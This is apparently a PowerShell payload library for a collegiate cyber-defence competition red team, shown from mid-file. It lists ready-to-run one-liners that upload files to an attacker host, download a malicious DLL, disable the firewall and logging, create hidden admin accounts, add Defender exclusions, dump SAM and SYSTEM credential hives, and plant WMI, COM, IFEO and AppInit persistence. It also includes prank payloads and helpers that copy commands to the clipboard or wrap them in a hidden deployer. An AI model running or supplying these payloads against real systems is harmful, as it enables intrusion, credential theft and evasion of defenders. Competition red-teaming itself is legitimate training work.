        Cmd   = 'Compress-Archive -Path C:\Users\*\Documents\*,C:\Users\*\Desktop\* -DestinationPath C:\ProgramData\backup.zip -Force -CompressionLevel Fastest'
        Notes = 'Zips all user Documents and Desktop files — transfer via SMB share or download cradle reverse. SYSTEM CONTEXT CAVEAT: SYSTEM can access most user profile folders but may be blocked by per-user ACLs on Server 2019+. Test access first.'
    }

    'EXFIL-002' = @{
        Desc  = 'HTTP exfil of file to attacker (curl-style)'
        Cmd   = '$f=[Convert]::ToBase64String([IO.File]::ReadAllBytes(''C:\ProgramData\s.dat'')); (New-Object Net.WebClient).UploadString(''http://ATTACKER_IP:8080/exfil'', $f)'
        Notes = 'Replace ATTACKER_IP — base64 encodes file and POSTs to attacker. Catch with: nc -lvnp 8080'
    }

    'EXFIL-003' = @{
        Desc  = 'ICMP exfil (slow but evades firewall rules that only watch TCP/UDP)'
        Cmd   = '$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((hostname)+"_"+(whoami))); $chunks=$d-split"(.{32})"|Where-Object{$_}; $chunks|ForEach-Object{cmd /c "ping -n 1 -l 1 ATTACKER_IP" 2>$null}'
        Notes = 'Replace ATTACKER_IP — uses ICMP pings to signal. More of a beacon than true data exfil.'
    }

    # ════════════════════════════════════════════════════════════
    # 🎮 IMPACT / FUN (CCDC Flair)
    # ════════════════════════════════════════════════════════════

    'FUN-001' = @{
        Desc  = 'Change desktop wallpaper (download from attacker)'
        Cmd   = '$w=New-Object Net.WebClient;$w.DownloadFile(''http://ATTACKER_IP:8080/wallpaper.jpg'',"$env:APPDATA\wp.jpg");Set-ItemProperty ''HKCU:\Control Panel\Desktop'' -Name Wallpaper -Value "$env:APPDATA\wp.jpg";rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,true'
        Notes = 'Replace ATTACKER_IP — host a fun image on your web server. Wallpaper updates immediately. SYSTEM CONTEXT WARNING: $env:APPDATA and HKCU resolve to SYSTEM profile from Task Scheduler. Wallpaper change will not affect any interactive user. Use interactive session only.'
    }

    'FUN-002' = @{
        Desc  = 'Text-to-speech announcement'
        Cmd   = 'Add-Type -AssemblyName System.Speech;(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(''Attention. Your system has been visited by the red team. Have a wonderful day.'')'
        Notes = 'Plays TTS audio through system speakers — guaranteed to make blue team do a double-take. SYSTEM CONTEXT WARNING: Session 0 has no audio device. Silent from Task Scheduler. Use interactive session only.'
    }

    'FUN-003' = @{
        Desc  = 'Notepad popup with message'
        Cmd   = '"''Red Team Was Here - CCDC 2026 <3''" | Out-File "$env:TEMP\rt.txt" -Force; Start-Process notepad "$env:TEMP\rt.txt"'
        Notes = 'Simple visible indicator — opens notepad with a message. Good for proving access. SYSTEM CONTEXT WARNING: Notepad opens in Session 0 (invisible) from Task Scheduler. No user will see it. Use interactive session only.'
    }

    'FUN-004' = @{
        Desc  = 'Invert mouse buttons (subtle chaos)'
        Cmd   = '$sig=''[DllImport("user32.dll")] public static extern bool SwapMouseButton(bool swap);''; $t=Add-Type -MemberDefinition $sig -Name ''WinAPI'' -Namespace ''Mouse'' -PassThru; $t::SwapMouseButton($true)'
        Notes = 'P/Invoke to swap left/right mouse buttons. Subtle enough to waste time before blue team realizes. SYSTEM CONTEXT WARNING: Runs in Session 0 from Task Scheduler — affects SYSTEM desktop, not interactive user mouse. Use interactive session only.'
    }

    'FUN-005' = @{
        Desc  = 'Rotate screen 180 degrees (requires display driver support)'
        Cmd   = 'cmd /c "reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Video"" /v Rotation /t REG_DWORD /d 2 /f 2>nul"; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { Write-Host "Screen rotated — restart explorer.exe to apply" }'
        Notes = 'May not work on all display drivers. The registry method requires a display restart to take effect. SYSTEM CONTEXT WARNING: Session 0 has no display. No effect from Task Scheduler. Use interactive session only.'
    }

    'FUN-006' = @{
        Desc  = 'Continuous random beep (background annoyance)'
        Cmd   = 'while($true){[Console]::Beep((Get-Random -Min 200 -Max 2000),(Get-Random -Min 100 -Max 500));Start-Sleep -Milliseconds (Get-Random -Min 5000 -Max 30000)}'
        Notes = 'Random frequency beeps at random intervals — maddening but harmless. Runs until process killed. SYSTEM CONTEXT WARNING: Session 0 has no audio device. Silent from Task Scheduler. Use interactive session only.'
    }

    'FUN-007' = @{
        Desc  = 'OIIA cat tribute — spinning ASCII cat with live recon (hostname/user/privs/admins) in a visible console window for 30 seconds'
        Cmd   = '$sc=''$fr=@(@("  /\_/\ ","  (^o.o^)","   > ^ < "),@("  /\_/\ ","  ( -.- )","   > ^ < "),@("  /\_/\ ","  (~.-~) ","   < ^ < "));$adm=try{(Get-LocalGroupMember Administrators -EA 0).Count}catch{0};$pv=@{$true="ELEVATED";$false="Standard"}[([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)];$e=[DateTime]::Now.AddSeconds(30);$host.UI.RawUI.BackgroundColor="Black";Clear-Host;while([DateTime]::Now -lt $e){foreach($g in $fr){if([DateTime]::Now -ge $e){break};Clear-Host;Write-Host "`n  ~~ OIIA OIIA OIIA ~~" -F Magenta;$g|%{Write-Host "  $_" -F Cyan};Write-Host ("  Host:{0}  User:{1}  Priv:{2}  Admins:{3}  {4}" -f (hostname),(whoami),$pv,$adm,(Get-Date -f "HH:mm:ss")) -F Yellow;Start-Sleep -ms 220}};Clear-Host'';$f="$env:ProgramData\oiia_diag.ps1";$sc|Out-File $f -Force;Start-Process powershell "-NoP -File `"$f`"" -WindowStyle Normal'
        Notes = 'Tribute to the OIIA spinning cat meme. Spawns a visible PowerShell window showing spinning ASCII cat + live proof-of-compromise info for 30 seconds, then exits. SYSTEM CONTEXT WARNING: Use -Persist registry for guaranteed user-session delivery. Task Scheduler / Session 0 spawns the window invisibly.'
    }

    'FUN-008' = @{
        Desc  = 'OIIA desktop graffiti — drops OIIA_RED_TEAM_WAS_HERE.txt with ASCII cat + live recon to Desktop, Public Desktop, and Temp'
        Cmd   = '$adm=try{(Get-LocalGroupMember Administrators -EA 0).Count}catch{0};$pv=@{$true="ELEVATED";$false="Standard"}[([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)];$art="  /\_/\    oiia oiia oiia`n  (o.o )   ~~~ OIIA RED TEAM ~~~`n  > ^ <`n`n  PROOF OF COMPROMISE`n  ==================`n  Host: $(hostname)`n  User: $(whoami)`n  Priv: $pv`n  Admins: $adm`n  Date: $([DateTime]::Now)`n`n  You have been visited by Apparition.`n  oiia oiia oiia oiia oiia";foreach($p in @("$env:PUBLIC\Desktop","$env:USERPROFILE\Desktop","$env:TEMP")){$art|Out-File "$p\OIIA_RED_TEAM_WAS_HERE.txt" -Force -EA 0}'
        Notes = 'Drops a persistent text file with OIIA ASCII art + hostname/user/privilege proof-of-compromise to Desktop, Public Desktop, and Temp. File named OIIA_RED_TEAM_WAS_HERE.txt — visible in File Explorer on next logon. SYSTEM OK — works from any session including Task Scheduler Session 0. No windows required.'
    }

    # ════════════════════════════════════════════════════════════
    # 🃏 MEME / ENTERTAINMENT
    # ════════════════════════════════════════════════════════════
    # Payloads marked SYSTEM OK work from Task Scheduler (Session 0).
    # Payloads marked INTERACTIVE ONLY require a visible user desktop —
    # use -Persist registry to fire them in the user logon session.
    # ════════════════════════════════════════════════════════════

    'MEME-001' = @{
        Desc  = 'Fake BSOD — WinForms error dialog styled as a crash screen'
        Cmd   = 'Add-Type -AN System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(":( Your PC ran into a problem and needs to restart.`n`nSTOP CODE: CRITICAL_RED_TEAM_PROCESS`n`nWhat failed: apparition.sys`n`nFor more information visit: aka.ms/windiag", "A problem has occurred", 0, 16)'
        Notes = 'MessageBoxIcon=16 (Error icon). Pops a scary BSOD-styled modal that must be dismissed. Harmless but alarming enough to cause panic. INTERACTIVE ONLY — use -Persist registry for user logon delivery.'
    }

    'MEME-002' = @{
        Desc  = 'Wall of Notepads — 10 cascading Notepad windows with red team message'
        Cmd   = '"Red Team Was Here — Apparition Delivery System v2.4`nCCDC 2026 | Execution without presence" | Out-File "$env:TEMP\rt.txt" -Force; 1..10 | ForEach-Object { Start-Process notepad "$env:TEMP\rt.txt"; Start-Sleep -Milliseconds 300 }'
        Notes = 'Opens 10 cascading Notepad windows with your message — chaotic and unmissable at logon. INTERACTIVE ONLY — use -Persist registry. VM-Validated CLEAN (2026-02-19, M4 test).'
    }

    'MEME-003' = @{
        Desc  = 'Text-to-speech announcement through system speakers at full volume'
        Cmd   = 'Add-Type -AN System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Rate=-2; $s.Volume=100; $s.Speak("Attention. Your system has been visited by the red team. Apparition Delivery System version 2.4. Have a wonderful day.")'
        Notes = 'TTS at full volume with slow rate for maximum effect. INTERACTIVE ONLY — Session 0 has no audio device. Use -Persist registry for delivery at next user logon.'
    }

    'MEME-004' = @{
        Desc  = 'Matrix rain — green cascading ASCII characters in a console window for 2 minutes'
        Cmd   = '$f="$env:TEMP\matrix.ps1"; ''$host.UI.RawUI.BackgroundColor="Black";$host.UI.RawUI.ForegroundColor="Green";Clear-Host;$ch=@("0","1","M","A","T","R","I","X","$","#","%","@");$w=$host.UI.RawUI.WindowSize.Width;$h=$host.UI.RawUI.WindowSize.Height;$e=(Get-Date).AddMinutes(2);while((Get-Date)-lt $e){$p=New-Object System.Management.Automation.Host.Coordinates (Get-Random -Max $w),(Get-Random -Max $h);$host.UI.RawUI.CursorPosition=$p;Write-Host $ch[(Get-Random -Max $ch.Count)] -NoNewline;Start-Sleep -ms 15}'' | Out-File $f -Force; Start-Process powershell "-NoP -File `"$f`"" -WindowStyle Normal'
        Notes = 'Spawns a visible black+green console with Matrix rain animation for 2 minutes then exits cleanly. SYSTEM OK — Task Scheduler spawns a new visible console window. VM-Validated CLEAN (2026-02-19, M3 test).'
    }

    'MEME-005' = @{
        Desc  = 'Caps Lock / Num Lock / Scroll Lock keyboard LED disco for 60 seconds'
        Cmd   = '$w=New-Object -ComObject WScript.Shell; $e=(Get-Date).AddSeconds(60); while((Get-Date)-lt $e){ $w.SendKeys("{CAPSLOCK}"); $w.SendKeys("{NUMLOCK}"); $w.SendKeys("{SCROLLLOCK}"); Start-Sleep -Milliseconds 250 }'
        Notes = 'Rapidly blinks all three keyboard indicator LEDs in sequence. Physical LEDs respond even from SYSTEM context. Time-limited to 60 seconds. SYSTEM OK. VM-Validated CLEAN (2026-02-19, M2 test).'
    }

    'MEME-006' = @{
        Desc  = 'Persistent clipboard hijack — replaces clipboard every 30 seconds with red team message'
        Cmd   = 'Add-Type -AN PresentationCore; while($true){ [Windows.Clipboard]::SetText("Never gonna give you up — Red Team was here — ADS v2.4"); Start-Sleep -Seconds 30 }'
        Notes = 'Every copy the blue team does gets overwritten 30 seconds later. SYSTEM OK — clipboard is shared across sessions. Runs until process is killed or task is removed. VM-Validated CLEAN (2026-02-19, M1 test).'
    }

    'MEME-007' = @{
        Desc  = 'Five sequential fake "Windows Security" warning popups'
        Cmd   = 'Add-Type -AN System.Windows.Forms; $m=@("Critical security event detected on this system.","Unauthorized access attempt has been logged.","Your credentials may have been compromised.","Red Team has accessed this machine.","Apparition Delivery System says hello."); 1..5 | ForEach-Object { [System.Windows.Forms.MessageBox]::Show($m[(Get-Random -Max 5)], "Windows Security", 0, 48); Start-Sleep -Milliseconds 800 }'
        Notes = 'Five sequential WinForms MessageBox popups (icon=48, Warning) with fake security alert messages. Each blocks until dismissed. INTERACTIVE ONLY — use -Persist registry.'
    }

    'MEME-008' = @{
        Desc  = 'OIIA spinning ASCII cat + live proof-of-compromise printout (30 second visible console)'
        Cmd   = '$f="$env:TEMP\oiia.ps1"; ''$fr=@("(=^._.^=)","(=^._.^)=","(^._.^=)=","=(^._.^)="); $e=(Get-Date).AddSeconds(30); $i=0; $host.UI.RawUI.BackgroundColor="Black"; Clear-Host; while((Get-Date)-lt $e){[Console]::SetCursorPosition(0,0); Write-Host " oiia oiia oiia oiia oiia" -F Magenta; Write-Host " $($fr[$i%4])" -F Cyan; Write-Host " RED TEAM WAS HERE -- ADS v2.4" -F Red; Write-Host " Host:$(hostname) User:$(whoami) Time:$(Get-Date -f HH:mm:ss)" -F Yellow; $i++; Start-Sleep -ms 250}; Write-Host "`n PROOF OF COMPROMISE" -F Green; Write-Host " ====================" -F Green; cmd /c "whoami /groups 2>nul" | Select-Object -First 8'' | Out-File $f -Force; Start-Process powershell "-NoP -File `"$f`"" -WindowStyle Normal'
        Notes = 'Spawns a visible black console: spinning OIIA cat animation for 30 sec, then prints group memberships as proof-of-compromise. SYSTEM OK (spawns a new console). For guaranteed user-session visibility use -Persist registry.'
    }

    'MEME-009' = @{
        Desc  = 'OIIA desktop graffiti — drops OIIA_RED_TEAM_WAS_HERE.txt to Public Desktop + Temp'
        Cmd   = '$art="  /\_/\    oiia oiia oiia`n  (o.o )   ~~~ RED TEAM WAS HERE ~~~`n  > ^ <`n`nProof of Compromise`n==================`nHost : $(hostname)`nUser : $(whoami)`nTime : $(Get-Date -f ""yyyy-MM-dd HH:mm"")"; @("$env:PUBLIC\Desktop","$env:USERPROFILE\Desktop","$env:TEMP") | ForEach-Object { $art | Out-File "$_\OIIA_RED_TEAM_WAS_HERE.txt" -Force -EA 0 }'
        Notes = 'Drops a persistent OIIA ASCII art + hostname/user/time proof-of-compromise file. SYSTEM OK — no visible window or user session required. File appears in File Explorer on next logon. Persists until manually removed.'
    }

    # ════════════════════════════════════════════════════════════
    # 🧩 COMBINED / MULTI-STAGE
    # ════════════════════════════════════════════════════════════

    'COMBO-001' = @{
        Desc  = 'Full initial access package: disable FW + enable RDP + create admin + disable logging'
        Cmd   = 'cmd /c "netsh advfirewall set allprofiles state off & net user svcAdmin Pa$$w0rd2026! /add & net localgroup Administrators svcAdmin /add"; Set-ItemProperty ''HKLM:\System\CurrentControlSet\Control\Terminal Server'' -Name fDenyTSConnections -Value 0; $sb=''HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging''; if(!(Test-Path $sb)){New-Item -Path $sb -Force|Out-Null}; Set-ItemProperty $sb -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force'
        Notes = 'The "I just got on this box" package — firewall down, admin created, RDP enabled, logging disabled'
    }

    'COMBO-002' = @{
        Desc  = 'Stealth package: add FW rules + hidden admin + Defender exclusions + disable logging'
        Cmd   = 'cmd /c "netsh advfirewall firewall add rule name=""Core Networking - DNS (UDP-In)"" dir=in action=allow protocol=tcp localport=3389,5985,445 enable=yes & net user svcUpdate Pa$$w0rd2026! /add & net localgroup Administrators svcUpdate /add"; $p=''HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList''; if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}; New-ItemProperty $p -Name svcUpdate -Value 0 -PropertyType DWord -Force|Out-Null; Add-MpPreference -ExclusionPath ''C:\ProgramData'' -Force; $sb=''HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging''; if(!(Test-Path $sb)){New-Item -Path $sb -Force|Out-Null}; Set-ItemProperty $sb -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force'
        Notes = 'Quieter version of COMBO-001: FW rules instead of disable, hidden user, Defender exclusions'
    }

    'COMBO-003' = @{
        Desc  = 'Recon + exfil package: enumerate everything + stage for pickup'
        Cmd   = '$o=@("=== $(hostname) / $(whoami) / $(Get-Date) ===","=== ADMINS ==="); $o+=cmd /c "net localgroup Administrators"; $o+="=== NETWORK ==="; $o+=ipconfig /all; $o+="=== CONNECTIONS ==="; $o+=netstat -an; $o+="=== DOMAIN ==="; $o+=cmd /c "net group ""Domain Admins"" /domain 2>nul"; $o+="=== TASKS ==="; $o+=cmd /c "schtasks /query /fo CSV /v 2>nul | findstr /i /v ""disable"""; $o|Out-File C:\ProgramData\r.txt -Force; cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y 2>nul"'
        Notes = 'Recon + credential dump in one payload — everything lands in C:\ProgramData ready for exfil'
    }

    # ════════════════════════════════════════════════════════════
    # 🔬 NOVEL / EXPERIMENTAL
    # ════════════════════════════════════════════════════════════

    'NOVEL-001' = @{
        Desc  = 'DLL search order hijack prep (plant DLL in PATH-priority location)'
        Cmd   = '$w=New-Object Net.WebClient;$w.DownloadFile(''http://ATTACKER_IP:8080/version.dll'',"$env:WINDIR\version.dll")'
        Notes = 'Replace ATTACKER_IP — drops a malicious version.dll where many apps search first. Build DLL on Kali with msfvenom.'
    }

    'NOVEL-002' = @{
        Desc  = 'COM object hijack persistence (survives task cleanup)'
        Cmd   = '$clsid=''{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}''; $p="HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"; New-Item -Path $p -Force|Out-Null; Set-ItemProperty $p -Name ''(Default)'' -Value ''C:\ProgramData\update.dll'' -Force; Set-ItemProperty $p -Name ThreadingModel -Value ''Both'' -Force'
        Notes = 'Hijacks a COM CLSID that explorer.exe loads — provides persistence without scheduled tasks or Run keys. SYSTEM CONTEXT WARNING: Writes to HKCU which resolves to SYSTEM hive from Task Scheduler. COM hijack will not trigger for interactive users. Rewrite to use HKU:\<SID> per-user or deploy from interactive session.'
    }

    'NOVEL-003' = @{
        Desc  = 'WMI event subscription persistence (another persistence layer)'
        Cmd   = '$q="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 120"; $f=[wmiclass]"\\.\root\subscription:__EventFilterToConsumerBinding"; $filter=([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance(); $filter.Name="WindowsUpdateCheck"; $filter.EventNamespace="root\cimv2"; $filter.QueryLanguage="WQL"; $filter.Query=$q; $filter.Put()|Out-Null; $consumer=([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance(); $consumer.Name="WindowsUpdateCheck"; $consumer.CommandLineTemplate="powershell.exe -NoP -W Hidden -C ""IEX(gc ''C:\ProgramData\update.ps1'' -Raw)"""; $consumer.Put()|Out-Null; $bind=$f.CreateInstance(); $bind.Filter=$filter.__PATH; $bind.Consumer=$consumer.__PATH; $bind.Put()|Out-Null'
        Notes = 'WMI permanent event subscription — fires 2 min after boot. Survives removal of scheduled tasks AND Run keys.'
    }

    'NOVEL-004' = @{
        Desc  = 'Screensaver hijack persistence (triggers on user idle)'
        Cmd   = '$ss=''HKCU:\Control Panel\Desktop''; Set-ItemProperty $ss -Name SCRNSAVE.EXE -Value ''powershell.exe'' -Force; Set-ItemProperty $ss -Name ScreenSaveActive -Value ''1'' -Force; Set-ItemProperty $ss -Name ScreenSaveTimeOut -Value ''300'' -Force; Set-ItemProperty $ss -Name ScreenSaverIsSecure -Value ''0'' -Force'
        Notes = 'Sets PowerShell as the screensaver — when user is idle for 5 min, PS launches. Combine with a script at a known path. SYSTEM CONTEXT WARNING: Writes to HKCU which resolves to SYSTEM hive from Task Scheduler. Screensaver hijack will not affect interactive users. Rewrite to use HKU:\<SID> per-user or deploy from interactive session.'
    }

    'NOVEL-005' = @{
        Desc  = 'AppInit_DLLs injection (loads DLL into every user-mode process)'
        Cmd   = 'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'' -Name AppInit_DLLs -Value ''C:\ProgramData\helper.dll'' -Type String -Force; Set-ItemProperty -Path ''HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'' -Name LoadAppInit_DLLs -Value 1 -Type DWord -Force'
        Notes = 'Injects a DLL into every process that loads user32.dll. Extremely persistent — survives nearly all cleanup.'
    }

    'NOVEL-006' = @{
        Desc  = 'Image File Execution Options debugger (hijack common tool)'
        Cmd   = '$target=''notepad.exe''; $p="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target"; New-Item -Path $p -Force|Out-Null; Set-ItemProperty $p -Name Debugger -Value ''powershell.exe -NoP -W Hidden -File C:\ProgramData\update.ps1'' -Force'
        Notes = 'When user runs notepad, it actually runs our script. Change target to any executable blue team might use. SYSTEM CONTEXT CAVEAT: The HKLM write works fine from SYSTEM, but the hijacked process runs as the triggering user, not SYSTEM. This is expected behavior — just note the context switch.'
    }

    'NOVEL-007' = @{
        Desc  = 'Print Monitor DLL persistence (very rare, loads at SYSTEM boot)'
        Cmd   = 'New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\WindowsCorePrinter'' -Name Driver -Value ''helper.dll'' -PropertyType String -Force'
        Notes = 'Registers a print monitor DLL — loaded by spoolsv.exe at SYSTEM level on every boot. Extremely rare in blue team detection playbooks.'
    }
}

# ============================================================
# DISPLAY / UTILITY FUNCTIONS
# ============================================================

function Show-Payloads {
    <#
    .SYNOPSIS
        Display all payloads in a formatted table
    #>
    Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║ CCDC Payload Library — Apparition Delivery System         ║" -ForegroundColor Cyan
    Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan

    $categories = [ordered]@{
        'FW'    = '🔥 Firewall Manipulation'
        'RDP'   = '🖥️  RDP Enablement'
        'USR'   = '👤 User Creation / Privilege Escalation'
        'SVC'   = '🔧 Service Manipulation'
        'C2'    = '📡 C2 / Beaconing'
        'CRED'  = '🔑 Credential Access'
        'DEF'   = '🛡️  Defense Evasion'
        'RECON' = '🔍 Reconnaissance'
        'LAT'   = '🌐 Lateral Movement Prep'
        'EXFIL' = '📁 Data Exfiltration'
        'FUN'   = '🎮 Impact / Fun'
        'MEME'  = '🃏 Meme / Entertainment'
        'COMBO' = '🧩 Combined / Multi-Stage'
        'NOVEL' = '🔬 Novel / Experimental'
    }

    foreach ($cat in $categories.GetEnumerator()) {
        Write-Host "  $($cat.Value)" -ForegroundColor Yellow
        $Payloads.GetEnumerator() | Where-Object { $_.Key -match "^$($cat.Key)-" } | ForEach-Object {
            Write-Host "    $($_.Key)" -ForegroundColor White -NoNewline
            Write-Host " — $($_.Value.Desc)" -ForegroundColor Gray
        }
        Write-Host ""
    }

    Write-Host "  Total: $($Payloads.Count) payloads" -ForegroundColor Green
    Write-Host "  Usage: `$Payloads['FW-002'].Cmd | clip  (copy to clipboard)" -ForegroundColor DarkGray
    Write-Host ""
}

function Get-Payload {
    <#
    .SYNOPSIS
        Get a payload by ID and optionally copy to clipboard
    .EXAMPLE
        Get-Payload FW-002
        Get-Payload FW-002 -Copy
    #>
    param(
        [Parameter(Mandatory)][string]$Id,
        [switch]$Copy
    )

    if (-not $Payloads.Contains($Id)) {
        Write-Host "Unknown payload ID: $Id" -ForegroundColor Red
        Write-Host "Available: $($Payloads.Keys -join ', ')" -ForegroundColor Gray
        return
    }

    $p = $Payloads[$Id]
    Write-Host "`n[$Id] $($p.Desc)" -ForegroundColor Cyan
    Write-Host "Notes: $($p.Notes)" -ForegroundColor DarkGray
    Write-Host "`nCommand:" -ForegroundColor Yellow
    Write-Host $p.Cmd -ForegroundColor White

    if ($Copy) {
        $p.Cmd | Set-Clipboard
        Write-Host "`n[+] Copied to clipboard" -ForegroundColor Green
    }

    Write-Host ""
    return $p.Cmd
}

function Deploy-Payload {
    <#
    .SYNOPSIS
        Generate ADS-OneLiner deployment for a library payload
    .EXAMPLE
        Deploy-Payload -Id FW-002 -Encrypt -Randomize -InstanceCount 3
    .NOTES
        Wraps ADS-OneLiner.ps1 with the selected payload
    #>
    param(
        [Parameter(Mandatory)][string]$Id,
        [switch]$Encrypt,
        [switch]$Randomize,
        [switch]$ZeroWidthStreams,
        [switch]$UseDeepPlacement,
        [int]$InstanceCount = 1,
        [int]$CreateDecoys = 0,
        [string]$OutputFile
    )

    if (-not $Payloads.Contains($Id)) {
        Write-Host "Unknown payload ID: $Id" -ForegroundColor Red
        return
    }

    $payload = $Payloads[$Id]
    Write-Host "[*] Deploying $Id : $($payload.Desc)" -ForegroundColor Cyan

    # Locate ADS-OneLiner.ps1
    $oneLinerPaths = @(
        (Join-Path $PSScriptRoot '../src/ADS-OneLiner.ps1')
        (Join-Path $PSScriptRoot 'ADS-OneLiner.ps1')
        './src/ADS-OneLiner.ps1'
    )

    $oneLinerPath = $null
    foreach ($p in $oneLinerPaths) {
        if (Test-Path $p) { $oneLinerPath = $p; break }
    }

    if (-not $oneLinerPath) {
        Write-Host "[-] ADS-OneLiner.ps1 not found" -ForegroundColor Red
        Write-Host "    Run from project root or place this file in payloads/" -ForegroundColor Gray
        return
    }

    $params = @{
        Payload = $payload.Cmd
        Encrypt = $Encrypt
        Randomize = $Randomize
        ZeroWidthStreams = $ZeroWidthStreams
        UseDeepPlacement = $UseDeepPlacement
        InstanceCount = $InstanceCount
        CreateDecoys = $CreateDecoys
    }

    if ($OutputFile) { $params.OutputFile = $OutputFile }

    & $oneLinerPath @params
}

# ============================================================
# AUTO-DISPLAY WHEN SOURCED
# ============================================================

# If run directly (not dot-sourced), show the library
if ($MyInvocation.InvocationName -ne '.') {
    Show-Payloads
}
